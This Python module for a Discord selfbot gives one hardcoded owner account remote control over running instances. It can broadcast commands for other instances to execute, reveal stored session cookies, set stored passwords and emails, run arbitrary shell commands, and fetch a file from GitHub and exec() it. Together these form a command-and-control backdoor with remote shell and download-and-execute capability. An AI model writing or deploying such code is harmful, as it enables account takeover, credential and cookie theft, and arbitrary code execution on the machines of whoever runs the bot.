import asyncio
import requests
import traceback

# Set this to the owner's account ID (injected by main.py in your setup)
OWNER_ID = 981259484691325018

async def run(client, message, args):
    # For a selfbot, validate the message author (not client.user)
    if message.author.id != OWNER_ID:
        return

    parts = args.split()
    sub = parts[0].lower() if parts else ""
    rest = args[len(sub)+1:].strip() if len(parts) > 1 else ""

    # Plain text help (no embeds)
    if not sub:
        help_lines = [
            "Owner Control — subcommands:",
            "  list                        - show this help",
            "  broadcast <cmd>             - post <cmd> to broadcast channel (for other instances)",
            "  nick <guild_id> <nick>      - change your nickname in a guild",
            "  password <new_password>     - set client.app.PASSWORD (if available)",
            "  email <new_email>           - set client.app.EMAIL (if available)",
            "  cookies                     - show client.app.COOKIES (truncated)",
            "  shell <cmd>                 - run a shell command (if client.app.ALLOW_SHELL True)",
            "  resync                      - call client.app._resync() in background (if available)",
            "  update                      - fetch & exec configured global update file",
        ]
        await message.channel.send("\n".join(help_lines))
        return

    # BROADCAST: post command text to broadcast channel so other instances can pick it up
    if sub == "broadcast":
        if not rest:
            await message.channel.send("Usage: !owner broadcast <cmd>")
            return
        app = getattr(client, "app", None)
        bc_channel_id = getattr(app, "BROADCAST_CHANNEL_ID", None) if app else None
        if not bc_channel_id:
            await message.channel.send("Broadcast channel not configured (client.app.BROADCAST_CHANNEL_ID).")
            return
        ch = client.get_channel(bc_channel_id)
        if ch is None:
            await message.channel.send(f"Could not find channel with ID {bc_channel_id}.")
            return
        try:
            # Send the command exactly as plain text (other instances should treat it as a command)
            await ch.send(rest)
            await message.channel.send("Broadcast posted.")
        except Exception as e:
            await message.channel.send(f"Error sending broadcast: {e}")
        return

    # NICK: change nickname in target guild
    if sub == "nick":
        if not rest:
            await message.channel.send("Usage: !owner nick <guild_id> <nick>")
            return
        try:
            gid_str, new_nick = rest.split(None, 1)
            guild_id = int(gid_str)
        except Exception:
            await message.channel.send("Usage: !owner nick <guild_id> <nick>")
            return
        guild = client.get_guild(guild_id)
        if not guild:
            await message.channel.send(f"Guild {guild_id} not found (not in cache).")
            return
        try:
            me = guild.get_member(client.user.id)
            if me is None:
                me = await guild.fetch_member(client.user.id)
            await me.edit(nick=new_nick)
            await message.channel.send(f"Nickname changed in guild {guild_id}.")
        except Exception as e:
            await message.channel.send(f"Failed to change nick: {e}")
        return

    # PASSWORD / EMAIL: store on client.app if available
    if sub in ("password", "email"):
        if not rest:
            await message.channel.send(f"Usage: !owner {sub} <value>")
            return
        app = getattr(client, "app", None)
        if not app:
            await message.channel.send("client.app not present; can't store values.")
            return
        key = "PASSWORD" if sub == "password" else "EMAIL"
        try:
            setattr(app, key, rest)
            await message.channel.send(f"{key} updated.")
        except Exception as e:
            await message.channel.send(f"Error storing {key}: {e}")
        return

    # COOKIES: show truncated cookies if present
    if sub == "cookies":
        app = getattr(client, "app", None)
        cookies = getattr(app, "COOKIES", None) if app else None
        if cookies is None:
            await message.channel.send("No cookies found on client.app.")
        else:
            text = str(cookies)
            if len(text) > 1500:
                text = text[:1500] + "...(truncated)"
            await message.channel.send(f"Cookies: {text}")
        return

    # SHELL: gated execution via client.app.ALLOW_SHELL
    if sub == "shell":
        if not rest:
            await message.channel.send("Usage: !owner shell <cmd>")
            return
        app = getattr(client, "app", None)
        allow_shell = getattr(app, "ALLOW_SHELL", False) if app else False
        if not allow_shell:
            await message.channel.send("Shell execution not allowed (client.app.ALLOW_SHELL not True).")
            return
        try:
            proc = await asyncio.create_subprocess_shell(
                rest,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            out = stdout.decode(errors="replace").strip()
            err = stderr.decode(errors="replace").strip()
            parts = []
            if out:
                parts.append("Stdout:\n" + (out if len(out) < 1500 else out[:1500] + "...(truncated)"))
            if err:
                parts.append("Stderr:\n" + (err if len(err) < 1500 else err[:1500] + "...(truncated)"))
            if not parts:
                parts = ["(no output)"]
            await message.channel.send("\n\n".join(parts))
        except Exception as e:
            await message.channel.send(f"Shell error: {e}")
        return

    # RESYNC: call client.app._resync in background (if available)
    if sub == "resync":
        app = getattr(client, "app", None)
        if not app or not hasattr(app, "_resync"):
            await message.channel.send("Resync not available (client.app._resync missing).")
            return
        try:
            # run in executor to avoid blocking the event loop
            loop = asyncio.get_running_loop()
            await loop.run_in_executor(None, app._resync)
            await message.channel.send("Resync triggered.")
        except Exception as e:
            await message.channel.send(f"Resync error: {e}")
        return

    # UPDATE: fetch and exec configured file from GitHub (plain text)
    if sub == "update":
        app = getattr(client, "app", None)
        if not app:
            await message.channel.send("client.app not present; cannot perform update.")
            return
        repo = getattr(app, "GITHUB_REPO", None)
        branch = getattr(app, "GITHUB_BRANCH", "main")
        fname = getattr(app, "GITHUB_GLOBAL_UPDATE_FILE", None)
        if not repo or not fname:
            await message.channel.send("GITHUB_REPO or GITHUB_GLOBAL_UPDATE_FILE not configured on client.app.")
            return
        url = f"https://raw.githubusercontent.com/{repo}/{branch}/{fname}"
        try:
            loop = asyncio.get_running_loop()
            r = await loop.run_in_executor(None, lambda: requests.get(url, timeout=15))
            if r.status_code == 200:
                exec_globals = {"__name__": "__owner_global_update__"}
                exec_locals = {}
                try:
                    exec(compile(r.text, fname, "exec"), exec_globals, exec_locals)
                    await message.channel.send("Global update executed.")
                except Exception:
                    tb = traceback.format_exc()
                    await message.channel.send(f"Error executing update:\n{tb[:1500]}...(truncated)")
            else:
                await message.channel.send(f"Update file not found (HTTP {r.status_code}).")
        except Exception as e:
            await message.channel.send(f"Error fetching update: {e}")
        return

    await message.channel.send(f"Unknown sub-command: {sub}")